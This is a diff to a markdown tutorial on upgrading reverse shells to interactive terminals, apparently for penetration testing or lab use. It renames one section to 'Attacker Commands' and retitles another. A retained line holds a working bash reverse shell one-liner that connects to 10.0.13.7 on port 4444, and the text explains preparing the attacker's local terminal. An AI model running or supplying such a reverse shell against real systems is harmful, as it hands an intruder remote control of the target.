@@ -9,7 +9,7 @@ Unlike a standard reverse shell, these commands enable:
 * Dynamic window resizing (automatic Row/Column synchronization).
 
 ------------------------------
-## 🛠️ "Bulletproof" Commands (Enhanced)
+## 🛠️ "Attacker" Commands
 These versions include logic to detect available binaries on the target system to prevent silent failures.
 
 **Option A: Python Standard**
@@ -29,7 +29,8 @@ bash -c 'bash -i >& /dev/tcp/10.0.13.7/4444 0>&1'
 
 
 ------------------------------
-## 🔍 Technical Breakdown (Deep Dive)## 1. Local Pre-processing (stty raw -echo)
+# What it does?
+## 1. Local Pre-processing (stty raw -echo)
 Prepares your local terminal (e.g., Kali) to stop processing characters locally.
 
 * raw: Forwards every keystroke (including Ctrl+C) directly over the network.
